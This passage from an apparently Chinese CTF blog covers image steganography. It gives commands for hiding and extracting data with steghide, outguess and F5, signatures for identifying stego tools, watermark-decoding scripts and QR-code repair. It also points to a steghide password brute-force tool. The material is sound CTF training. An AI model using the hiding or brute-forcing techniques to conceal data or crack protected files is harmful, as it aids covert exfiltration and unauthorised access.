src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/ec316b9fd6cd479a9ce33796e89a6122.png" alt="img"></p><p>②.\Stegdetect.exe -tjopi -s 10.0 1.jpg</p><p>Corrupt JPEG data: 2684 extraneous bytes before marker 0xbf<br>1.jpg : error: Unsupported marker type 0xbf</p><p>损坏的JPEG数据：2684个小字节在标记之前0xbf之前<br>1.JPG：错误：未支撑的标记类型0xbf</p><h4 id="第四步：结果分析"><a href="#第四步：结果分析" class="headerlink" title="第四步：结果分析"></a>第四步：结果分析</h4><p>损坏的第2684个字节的位置，应该被插入了数据</p><p>但是未检测出对应的软件</p><p>再使用数据编辑工具提取分析出插入的数据</p><h4 id="补充：批量操作"><a href="#补充：批量操作" class="headerlink" title="补充：批量操作"></a>补充：批量操作</h4><p>.\stegdetect.exe -tjopi -s10.0 *.jpg</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/b9cca4af2b934265931ab1428d7e195a.png" alt="img"></p><p>6.1、模板：<br>stegdetect [ −qnV] [ −s float] [ −d num] [ −t tests] [file …]</p><p>6.2、命令：<br>-q：仅显示可能包含隐藏内容的图像</p><p>-n：启用检查JPEG文件头功能， 以降低误报率。 如果启用， 所有带有批注区域的文件将被视为没有被嵌入信息。 如果JPEG文件的JFIF标识符中的版本号不是1.1, 则禁用OutGuess检测。</p><p>-s：修改检测算法的敏感度， 该值的默认值为1。 检测结果的匹配度与检测算法的敏感度成正比， 算法敏感度的值越大， 检测出的可疑文件包含敏感信息的可能性越大。</p><p>-ct：打印带行号的调试信息。</p><p>-v：显示软件的版本编号。</p><p>-d num：打印调试信息。</p><p>6.3、对隐写工具的检测<br>-t：设置要检测哪些隐写工具（默认检测j opi), 可设置的选项如下：</p><p>-j：检测图像中的信息是否是用jsteg嵌入的。</p><p>-0：检测图像中的信息是否是用OU七 guess嵌入的。</p><p>-p：检测图像中的信息是否是用jphide嵌入的。</p><p>-i：检测图像中的信息是否是用 invisible secre七s嵌入的</p><h3 id="Jphswin-exe"><a href="#Jphswin-exe" class="headerlink" title="Jphswin.exe"></a>Jphswin.exe</h3><p>我用的是windows版本的，界面如下<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134615.png" alt="在这里插入图片描述"><br>使用起来也很简单，点击<code>open jpeg</code>打开图片，然后点击<code>seek</code>，如果有密码就输入密码，没有就直接回车<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134616.png" alt="在这里插入图片描述"></p><h3 id="Free-File-Camouflage"><a href="#Free-File-Camouflage" class="headerlink" title="Free_File_Camouflage"></a>Free_File_Camouflage</h3><p>不算太常见的一个软件，123分别是</p><blockquote><p>解密的图片的位置<br>如果有密码就勾选，然后输入密码，没有就直接跳过<br>解出文件放在什么位置</p></blockquote><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY5NjU2OA==,size_16,color_FFFFFF,t_70-166835285134617.png" alt="在这里插入图片描述"></p><h3 id="f5-steganography-（F5隐写，需要passwd）"><a href="#f5-steganography-（F5隐写，需要passwd）" class="headerlink" title="f5-steganography （F5隐写，需要passwd）"></a>f5-steganography （F5隐写，需要passwd）</h3><p>kali中安装，直接<code>git clone https://github.com/matthewgao/F5-steganography</code></p><p>具体使用：</p><pre><code class="python">进入f5-steganography文件夹后，打开终端# 解密java Extract filename.jpg -p 密码运行后会在文件夹里生成一个output.txt，打开即可# 加密java Embed 原图.jpg 生成图.jpg -e 隐藏的文件.txt -p 密码1234567</code></pre><h3 id="outguess-（可需要passwd）"><a href="#outguess-（可需要passwd）" class="headerlink" title="outguess （可需要passwd）"></a>outguess （可需要passwd）</h3><p>kali中安装：</p><pre><code class="python">先下载git clone https://github.com/crorvick/outguess然后进入outguess文件夹，打开终端输入./configure &amp;&amp; make &amp;&amp; make install成功之后即可1234</code></pre><p>使用：</p><pre><code class="python">进入文件夹后打开终端加密outguess -k 密码 -d hidden.txt 1.jpg 2.jpg#hidden.txt是要隐写的内容，运行后1.jpg会覆盖2.jpg解密outguess -k 密码 -r 2.jpg out.txtoutguess -r 2.jpg out.txt   #不用密码的情况123456789</code></pre><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><p>kali中的安装：<code>sudo apt-get install steghide</code></p><p>使用：</p><pre><code class="python">加密steghide embed -cf out.jpg -ef flag.txt [-p 密码]把flag.txt隐写到out.jpg中，如果要添加密码，尾部接上 -p 密码解密steghide info out.jpg  #查看图片中嵌入的文件信息#提取隐藏内容steghide extract -sf out.jpg -p 密码steghide extract -sf out.jpg123456789</code></pre><p>steghide本身不支持爆破密码，可以借助<a href="https://github.com/Va5c0/Steghide-Brute-Force-Tool">https://github.com/Va5c0/Steghide-Brute-Force-Tool</a></p><p>使用前还要安装一个库：<code>pip install progressbar2</code></p><p>使用方法：</p><pre><code class="python">python steg_brute.py -b -d [字典] -f [jpg_file]1</code></pre><p>这个工具用不了的话可以尝试<code>stegseek</code></p><h2 id="png-amp-bmp"><a href="#png-amp-bmp" class="headerlink" title="png &amp; bmp"></a>png &amp; bmp</h2><h3 id="普通盲水印"><a href="#普通盲水印" class="headerlink" title="普通盲水印"></a>普通盲水印</h3><p>项目地址：<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a><br>具体安装过程自行百度</p><p>使用：</p><pre><code class="python">加密python2 bwm.py encode 1.png water.png 2.png #PY2python3 bwmforpy3.py encode 1.png water.png 2.png #PY3解密python2 bwm.py decode 1.png 2.png out.png  #PY2python3 bwmforpy3.py decode 1.png 2.png out.png  #PY3py2和py3的算法不一样，得到的out.png清晰度也不一样，建议都试一下也可以加--alpha参数  可能会使图片更清晰python3 bwmforpy3.py decode 1.png 2.png out.png --alpha 10 #PY31234567891011</code></pre><h3 id="频域盲水印"><a href="#频域盲水印" class="headerlink" title="频域盲水印"></a>频域盲水印</h3><p>脚本：</p><pre><code class="python"># coding=utf-8import cv2   import numpy as npimport randomimport osfrom argparse import ArgumentParserALPHA = 5def build_parser():    parser = ArgumentParser()    parser.add_argument(&#39;--original&#39;, dest=&#39;ori&#39;, required=True)    parser.add_argument(&#39;--image&#39;, dest=&#39;img&#39;, required=True)    parser.add_argument(&#39;--result&#39;, dest=&#39;res&#39;, required=True)    parser.add_argument(&#39;--alpha&#39;, dest=&#39;alpha&#39;, default=ALPHA)    return parserdef main():    parser = build_parser()    options = parser.parse_args()    ori = options.ori    img = options.img    res = options.res    alpha = options.alpha    if not os.path.isfile(ori):        parser.error(&quot;original image %s does not exist.&quot; % ori)    if not os.path.isfile(img):        parser.error(&quot;image %s does not exist.&quot; % img)    decode(ori, img, res, alpha)def decode(ori_path, img_path, res_path, alpha):    ori = cv2.imread(ori_path)    img = cv2.imread(img_path)    ori_f = np.fft.fft2(ori)    img_f = np.fft.fft2(img)    height, width = ori.shape[0], ori.shape[1]    watermark = (ori_f - img_f) / alpha    watermark = np.real(watermark)    res = np.zeros(watermark.shape)    random.seed(height + width)    x = range(height / 2)    y = range(width)    random.shuffle(x)    random.shuffle(y)    for i in range(height / 2):        for j in range(width):            res[x[i]][y[j]] = watermark[i][j]    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])if __name__ == &#39;__main__&#39;:    main()12345678910111213141516171819202122232425262728293031323334353637383940414243444546</code></pre><p>使用命令：<code>python BlindWaterMarkplus.py --original 1.png --image 2.png --result res.png</code></p><p>如果得到的res.png有问题，把1.png和2.png互换位置试一下</p><h3 id="zsteg（lsb隐写）"><a href="#zsteg（lsb隐写）" class="headerlink" title="zsteg（lsb隐写）"></a>zsteg（lsb隐写）</h3><p>kali安装：<code>gem install zsteg</code></p><p>使用：</p><pre><code class="python">zsteg 1.pngzsteg 1.bmp12</code></pre><h3 id="PNGDebugger-exe（检查IDAT块）"><a href="#PNGDebugger-exe（检查IDAT块）" class="headerlink" title="PNGDebugger.exe（检查IDAT块）"></a>PNGDebugger.exe（检查IDAT块）</h3><p>一般在windows系统下使用，在文件夹中打开cmd命令行</p><p>输入：<code>PNGDebugger.exe filename.png</code></p><h3 id="tweakpng-exe"><a href="#tweakpng-exe" class="headerlink" title="tweakpng.exe"></a>tweakpng.exe</h3><p>windows系统下的一个软件，是很好用的一个PNG图像浏览工具</p><p>用来<code>增加或者删除png图片的IDAT块</code>很方便，之前做过八神的一个题，就是删除了一个png的图片中的部分IDAT块，保存得到一张不同的图片，其中就有flag，这里因为对png的结构了解的不是很透彻，原理说不清楚。</p><p>在使用这个软件打开图片之前，建议先用<code>PNGDebugger</code>看一下图片中<strong>有多少IDAT块的crc32是出错</strong>的，因为在使用这个软件的时候，每一个错误都会有一个弹窗。</p><p>比如misc入门的<code>misc44</code>就不建议用这个软件打开</p><h3 id="png加密隐写"><a href="#png加密隐写" class="headerlink" title="png加密隐写"></a>png加密隐写</h3><p>工具<br><a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p><p>kali——CTF_py</p><p>用法：<code>python lsb.py extract keyword.png out lovekfc</code></p><p>示例：<a href="https://blog.csdn.net/weixin_44604541/article/details/111676599">(62条消息) 攻防世界 Misc高手进阶区 5分题 Keyword_思源湖的鱼的博客-CSDN博客</a></p><h3 id="PixelJihad-（png）"><a href="#PixelJihad-（png）" class="headerlink" title="PixelJihad （png）"></a>PixelJihad （png）</h3><p><a href="https://sekao.net/pixeljihad/">PixelJihad (sekao.net)</a></p><h1 id="隐写总结"><a href="#隐写总结" class="headerlink" title="隐写总结"></a>隐写总结</h1><p><strong>总结：</strong></p><p><strong>个人推荐优先掌握熟练没有明显隐写特征的，有隐写特征的你过一眼，后期对照网站看一下就知道是那种隐写。</strong></p><hr><h1 id="没有明显隐写特征"><a href="#没有明显隐写特征" class="headerlink" title="没有明显隐写特征"></a>没有明显隐写特征</h1><h2 id="1-SilentEye"><a href="#1-SilentEye" class="headerlink" title="1.SilentEye"></a>1.SilentEye</h2><p><strong>支持类型：PNG、JPG、JPEG、BMP、TIF、TIFF、WAV</strong></p><p><strong>虽然可以隐写PNG格式，但是隐写保存的格式只能为JPG或者BMP</strong></p><ol><li>JPG类型特征：</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538472.jpg"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538472.jpg" alt="silenteye"></a></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538473.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538473.png" alt="image-20221108082326638"></a></p><p>如果你碰到了如下的图片，有很多小圆圈，那你用<code>stegsolve</code>也会看到很多的小圆圈，所以你就不要再去使用 <code>stegsolve</code> 去看通道了，直接大胆点盲猜图片被<code>SilentEye</code> 工具隐写了（图片来之[SICTF2023 Misc 王八树木]）</p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538474.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538474.png" alt="image-20230119140407725"></a></p><p>该题的层结构大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0xB7, 0x21, 0xB7</code>（注意：这个不是一定主要的技巧是使用 <code>stegsolve</code> 看通道）</p><ol><li>BMP类型没有太多特征</li></ol><h2 id="2-wbStego4"><a href="#2-wbStego4" class="headerlink" title="2.wbStego4"></a>2.wbStego4</h2><p><strong>支持类型：BMP、RLE、PDF（常见）</strong></p><ol><li>BMP类型特征：</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538475.jpg"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538475.jpg" alt="wbStego4"></a></p><p>最低位有明显隐写特征</p><ol><li>PDF类型特征：</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538476.jpg"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538476.jpg" alt="wb4_pdf"></a></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538477.jpg"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538477.jpg" alt="wb4_pdf2"></a></p><p>有明显的：<code>09 09 09 20 20 09 20 09 0D</code>的字节特征，主要字节是<code>09 20 0D</code>。</p><p>以下内容来源：<a href="https://www.cnblogs.com/sherlson/articles/15851383.html">https://www.cnblogs.com/sherlson/articles/15851383.html</a></p><pre><code>plaintextwbStego4open是一个隐写开源工具，它支持Windows和Linux平台。你可以用wbStego4open可以把文件隐藏到BMP、TXT、HTM和PDF文件中，且不会被看出破绽。还可以用它来创建版权标识文件并嵌入到文件中将其隐藏。wbStego在插入数据时（此处以非加密的版权信息为例），充分利用了插入法和LSB修改法两种技术。wbStego4open会把插入数据中的每一个ASCII码转换为二进制形式，然后把每一个二进制数字再替换为十六进制的20或者09，20代表0，09代表1。例如，在wbStego4open的版权管理器（Copyright Manager）中，输入一个包含“Oblivion”的地址，wbStego4open就会将其由ASCII码转换成相应的二进制码，然后再用0x20和0x09替换每个二进制数。</code></pre><p>如何判断是否文件采用<code>wbStego4open</code>加密？</p><ol><li>将文件导入010editor、winhex之类的十六进制查看工具</li><li>如果<code>20</code>、<code>09</code>出现次数较多，则有可能为<code>wbStego4open</code>加密</li><li><strong>当隐写的内容很少的时候大概率没有20、09出现最多的特征了，最好参考上图的字节特征。</strong></li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538479.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538479.png" alt="image-20221202162449054"></a></p><h2 id="3-cloacked-pixel"><a href="#3-cloacked-pixel" class="headerlink" title="3.cloacked-pixel"></a>3.cloacked-pixel</h2><p><strong>支持类型：PNG、JPG(隐写后自动转换为PNG)</strong></p><p>特征如下：</p><ol><li>IDAT层大小</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538480.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538480.png" alt="image-20221115180358321"></a></p><p>IDAT结构大小会为0x1000C，其中length占4字节，IDAT标记占4字节，内容占65536字节，CRC32占4字节。</p><p><code>65536 + length + IDAT + CRC32 = 0x1000C</code>，也就是每个IDAT层会被装满。</p><ol><li>图片位深度32位，但是你使用<code>StegSolve</code>观察图片的时候，Alpha通道全部都是255，也就是白色。</li></ol><h2 id="4-steghide"><a href="#4-steghide" class="headerlink" title="4.steghide"></a>4.steghide</h2><p><strong>支持类型：JPEG、BMP、WAV 和 AU</strong></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538481.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538481.png" alt="image-20221115190104544"></a></p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0xB7, 0x21, 0xB7</code></p><h2 id="5-outguess"><a href="#5-outguess" class="headerlink" title="5.outguess"></a>5.outguess</h2><p><strong>支持类型：JPG</strong></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538481.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538481.png" alt="image-20221115190104544"></a></p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0xB7, 0x21, 0xB7</code></p><h2 id="6-stegpy"><a href="#6-stegpy" class="headerlink" title="6.stegpy"></a>6.stegpy</h2><p><strong>支持类型：PNG、JPG、GIF、BMP、WEBP、&#x3D;&#x3D;WAV&#x3D;&#x3D;</strong></p><p><strong>除了PNG格式其他的图片格式隐写后自动转换为PNG</strong></p><p>特征如下：</p><ol><li>IDAT层大小</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538480.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538480.png" alt="image-20221115180358321"></a></p><p>IDAT结构大小会为0x1000C，其中length占4字节，IDAT标记占4字节，内容占65536字节，CRC32占4字节。</p><p><code>65536 + length + IDAT + CRC32 = 0x1000C</code>，也就是每个IDAT层会被装满。</p><ol><li>图片位深度32位，但是你使用<code>StegSolve</code>观察图片的时候，Alpha通道全部都是255，也就是白色。</li></ol><h2 id="7-jphide"><a href="#7-jphide" class="headerlink" title="7.jphide"></a>7.jphide</h2><p><strong>支持类型：JPG、JPEG</strong></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538482.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538482.png" alt="image-20221118192116807"></a></p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x21, 0x8D, 0x21, 0x84</code></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538483.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538483.png" alt="image-20221118193139991"></a></p><p>bugku奇怪的压缩包中的<code>xiaoxiaoshumu.jpg</code>，也出现了不一样的情况</p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x1E, 0x53, 0x1C, 0x2A</code></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538484.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538484.png" alt="image-20221209130453397"></a></p><p>首届“天权信安&amp;catf1ag”网络安全联合公开赛中的一题<code>嘿嘿.jpg</code>，也出现了不一样情况</p><p>层大小从上往下依次为<code>0x45, 0x45, 0x13, 0x1E, 0x4D, 0x1B, 0x25</code></p><h2 id="8-F5-steganography"><a href="#8-F5-steganography" class="headerlink" title="8.F5-steganography"></a>8.F5-steganography</h2><p>特征：<strong>早期F5算法总插入</strong><code>AJPEG Encoder Copyright 1998, James R. Weeks and BioElectroMech.</code></p><p>命令<code>java Extract 图片名称 (-p password)</code>会生成output.txt，隐写内容就在里面。</p><p>（这个我也没玩的很透彻，但是我在手动尝试隐写的时候发现注释也是可以修改的）</p><h2 id="9-JSteg"><a href="#9-JSteg" class="headerlink" title="9.JSteg"></a>9.JSteg</h2><p>JPG特征：</p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538492.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538492.png" alt="image-20221213144232849"></a></p><p>层大小从上往下依次为<code>0x86, 0x13, 0x1A4</code></p><hr><h1 id="有明显隐写特征"><a href="#有明显隐写特征" class="headerlink" title="有明显隐写特征"></a>有明显隐写特征</h1><h2 id="1-Free-File-Camouflage"><a href="#1-Free-File-Camouflage" class="headerlink" title="1.Free File Camouflage"></a>1.Free File Camouflage</h2><p><strong>支持类型：JPG</strong></p><ol><li>尾部会出现很多base64字段</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538485.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538485.png" alt="image-20221118193524649"></a></p><ol><li>如果隐写的内容较少会出现，你会看见尾部的特征结构如下：</li></ol><pre><code>FF D9` + `第一段base64` + `0D 0A` + `第二段base64` + `0D 0A</code></pre><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538486.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538486.png" alt="image-20221118193630649"></a></p><h2 id="2-DeEgger-Embedder"><a href="#2-DeEgger-Embedder" class="headerlink" title="2.DeEgger Embedder"></a>2.DeEgger Embedder</h2><p><strong>支持类型：PNG、JPG</strong></p><p><strong>PNG特征：</strong></p><ol><li>尾部会出现很多无意义的字符</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538487.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538487.png" alt="image-20221118194554713"></a></p><ol><li>IDAT层的大小都为<code>0x200C</code>（除了最后一层IDAT）</li></ol><p><strong>JPG特征：</strong></p><ol><li>尾部会出现很多无意义的字符</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538488.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538488.png" alt="image-20221118194949346"></a></p><h2 id="3-OurSecret"><a href="#3-OurSecret" class="headerlink" title="3.OurSecret"></a>3.OurSecret</h2><ol><li>JPG特征：</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538489.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538489.png" alt="image-20221208221306007"></a></p><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538490.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538490.png" alt="image-20221208221342521"></a></p><p>特征是这个<code>ž—º*</code>，会在jpg文件层结束后出现。</p><p>尾部特征是<code>l&lt;9l0kl10n88j:8&lt;....</code></p><ol><li>PNG特征：</li></ol><p><a href="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061538491.png"><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/202302061538491.png" alt="image-20221208221706530"></a></p><p>和上述的JPG特征一样。</p><h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><h2 id="二进制转二维码"><a href="#二进制转二维码" class="headerlink" title="二进制转二维码"></a>二进制转二维码</h2><p>这里以bugku中的<code>神奇宝贝</code>为例</p><p>拿到一串二进制，如果它的<code>长度被开方后正好是整数</code>，比如这题，满足<code>625=25*25</code>，就可以考虑转二维码。</p><pre><code class="python">import PILfrom PIL import ImageMAX = 25  #图片边长img = Image.new(&quot;RGB&quot;,(MAX,MAX))str=&quot;1111111001110111001111111100000100001101010100000110111010011100101010111011011101010110000101011101101110101010111010101110110000010011001101010000011111111010101010101111111000000000100101000000000011000111011010110000110001000000010100001010111100001011110101100111110011100101101001100101010010111000101011100100101101001111110000110101011110011010000010010001011100001111000010011101010110001100101110101000111011111010100000000110001101000110001111111011001100101010101100000101111001110001100010111010011100011111101111011101001101111011010011101110100010011010010010110000010100011010011110011111111011011100101010001&quot;i = 0for y in range (0,MAX):    for x in range (0,MAX):        if(str[i] == &#39;1&#39;):            img.putpixel([x,y],(0, 0, 0))        else:            img.putpixel([x,y],(255,255,255))        i = i+1img.show()img.save(&quot;flag.png&quot;)123456789101112131415</code></pre><h2 id="二维码的修复"><a href="#二维码的修复" class="headerlink" title="二维码的修复"></a>二维码的修复</h2><p>有的时候，得到的二维码是不完整的，如果缺失的部分比较少，是可以直接扫出来的。</p><p>缺失部分比较多的时候就要考虑修复了，这里以bugku的<code>Improve yourself</code>为例，其中一步得到的二维码缺了三块定位符。<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAei52b2xjYW5v,size_19,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>这里推荐一个在线网站，<a href="https://merricx.github.io/qrazybox/pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAei52b2xjYW5v,size_20,color_FFFFFF,t_70,g_se,x_16.png)">https://merricx.github.io/qrazybox/，进去的页面如下，蓝色箭头位置是二维码大小，根据实际情况进行修改。![在这里插入图片描述](/../pic/CTF——MISC——图片隐写.assets/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAei52b2xjYW5v,size_20,color_FFFFFF,t_70,g_se,x_16.png)</a><br>红色箭头位置也可以点击，这里根据实际情况对定位符的一些设置进行修改。<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAei52b2xjYW5v,size_20,color_FFFFFF,t_70,g_se,x_16-166835285134618.png" alt="在这里插入图片描述"><br>有的时候，题目给了一个图片文件，打开发现是只有上半部分的二维码，一般把图片高度改高就能得到完整的二维码。</p><h2 id="Aztec-Code"><a href="#Aztec-Code" class="headerlink" title="Aztec Code"></a>Aztec Code</h2><p>大概长这样<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.assets/10f5966a6f034e40b0f7c09ab2dc592c.gif" alt="请添加图片描述"><br>使用在线网站进行解码：<a href="https://products.aspose.app/barcode/recognize/aztec#result">https://products.aspose.app/barcode/recognize/aztec#result</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC—音频隐写</title>
      <link href="/2023/03/07/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/"/>
      <url>/2023/03/07/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/</url>
      
